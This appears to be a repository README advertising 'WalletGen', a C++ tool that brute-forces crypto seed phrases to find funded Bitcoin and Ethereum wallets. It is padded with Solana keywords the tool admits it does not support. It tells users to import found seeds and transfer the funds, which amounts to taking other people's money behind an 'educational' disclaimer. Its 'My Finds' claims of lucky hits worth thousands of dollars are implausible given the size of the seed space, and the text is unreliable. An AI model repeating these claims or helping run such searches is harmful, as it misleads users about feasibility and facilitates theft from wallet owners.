# WalletGen: Solana Generator - Discover the Power of Crypto Wallet Creation

Looking for a **Solana generator wallet**? **WalletGen** is a powerful, open-source tool designed for crypto wallet generation, brute force, and potential recovery. While primarily focused on Bitcoin and Ethereum, WalletGen's robust architecture and speed can be adapted to explore and test Solana wallets (note: direct Solana support may require community contributions).

<!--
Meta description:
Need a Solana generator wallet? Explore WalletGen, a fast open-source tool. It's excellent for Bitcoin and Ethereum recovery, offering great potential for Solana support.
-->

## Quick Navigation
- [How It Works](#how-it-works)
- [Why WalletGen](#why-walletgen)
- [Features](#features)
- [Download WalletGen](#how-to-start)
- [Database Download](#download-and-use-database-for-more-speed)
- [The Program Found a Wallet - What Next?](#the-program-found-a-wallet--whats-next)
- [Recovery Your Bitcoin Wallet](#recovery-your-bitcoin-wallet)
- [My Finds](#my-finds)
- [FAQ](#-frequently-asked-questions-faq)
- [Build Instructions](#building-the-project)
- [Donate](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Android-blue)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="Solana generator wallet" title="WalletGen - Solana Generator Wallet" height="460" src="/resources/grid.webp" />
</p>

⚠️ **Disclaimer**: WalletGen is a research and educational tool. It is not intended for unauthorized access or malicious activity. Use it responsibly and only with wallets you own or have permission to access.  Note: The core tool focuses on BTC and ETH. Community contributions may be needed to unlock full Solana support.

## How It Works

WalletGen is designed to generate wallets. It supports key algorithms for popular chains.

The software compares generated addresses against address databases or checks balances in real-time via blockchain explorers.

Wallet Gen is built in C++ and is open-source, allowing customization. Compared to Python-based wallet generators, Wallet Gen boasts significantly higher speeds, utilizing your CPU & GPU.

##  Why WalletGen?

Though designed for Bitcoin and Ethereum, the core of **WalletGen** can be expanded. Its speed and efficiency make it a strong foundation for potential Solana wallet exploration and experimentation. Written in C++ and optimized for multi-threaded CPU and GPU usage, WalletGen provides excellent performance for those seeking a fast, open-source solution.

## Features

-   **Cryptocurrency Wallet Creation:** Provides tools to generate various crypto wallets.
-   **Brute Force Search:** Searches for wallets with balances using brute-force methods, which *could* be adapted for Solana (with modifications).
-   **Algorithm Support:** Uses key algorithms.
-   **Database Integration:** Supports database integration for search acceleration.
-   **High-Speed Operation:** Designed to take full advantage of your CPU and GPU.
-   **Bitcoin Wallet Recovery:** The program allows recovering Bitcoin wallets by seed phrase.

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

<p align="center">
    <img width="1000" height="460" alt="Solana generator wallet demo" title="WalletGen - Solana Generator Demo" src="/resources/print.webp" />
</p>

<p align="center">
    <img width="1000" height="460" alt="Solana generator wallet on Linux" title="WalletGen - Solana Generation on Linux" src="/resources/explorer.webp" />
</p>

# How to start

## Windows 
- Download [Release](../../releases) 
- Unpack anywhere
- Run `WalletGen.exe`

Or Just Download [Installer](../../releases)

## Linux (x86-64bit)

Use wget 
or download [Release for Linux](../../releases) 




## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** allows you to search for crypto wallets with a balance.

### For Bitcoin (BTC) wallets:

*   Select option 3 in the menu or run start_search_btc.bat to search Bitcoin wallets via the internet. This uses real-time balance checks.

*   Choose option 6 to search Bitcoin wallets using the database. This is a faster method.

### For EVM wallets (Ethereum, BNB, MATIC, etc.):

*   Choose option 5 or run start_search_evm.bat to search EVM wallets over the internet.

*   Choose option 6 to search EVM wallets using the database.

## The Program Found a Wallet — What’s Next?

When the program finds a wallet with a balance:
*   The search will stop immediately.
*   The wallet details will be displayed.
*   The data will be saved.

### How to Access the Funds?
1.  Import the **mnemonic seed phrase** from the found wallet into any compatible crypto wallet.
2.  Transfer funds to your wallet.

## Recovery Your Bitcoin Wallet

WalletGen offers tools for recovering Bitcoin wallets via seed phrase.

### Process Description

#### Search for missing words:

If your seed phrase is missing words, use * as a placeholder.

#### Entering a complete seed-phrase:

Enter the full 12-word seed to check balances.

![recovery](/resources/popup.webp)

### Important recommendations

*   Seed-phrase must contain exactly 12 words.
*   Use only the * symbol for missing words.
*   Searching for missing words may take time.
*   Successful recovery stops the program and saves data.

## My Finds

![mywallet](/resources/chart.webp)

I’ve recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second contained 0.0528 BTC (roughly $4800 at the time of discovery).
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/resources/main.webp" />
</p>

### New Find 4/9/2025

After a week of non-stop wallet searching, I finally found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.

![image](/resources/dot.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

![image](/resources/display.webp)

## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or any compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
You can download the WalletGen given on the [release download page](../../releases) 

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [release   page](../../releases) 

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes. WalletGen uses brute-force seed generation and a known-address database to help users potentially **recover lost Bitcoin wallets**.

### ❓ Is WalletGen a seed phrase generator?
Yes. WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Donate

If you find a wallet with a balance, please consider donating a small portion as a thank you. This motivates me to keep working on the program!

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)



Update:  06/13/2025 Fixed broken url, now working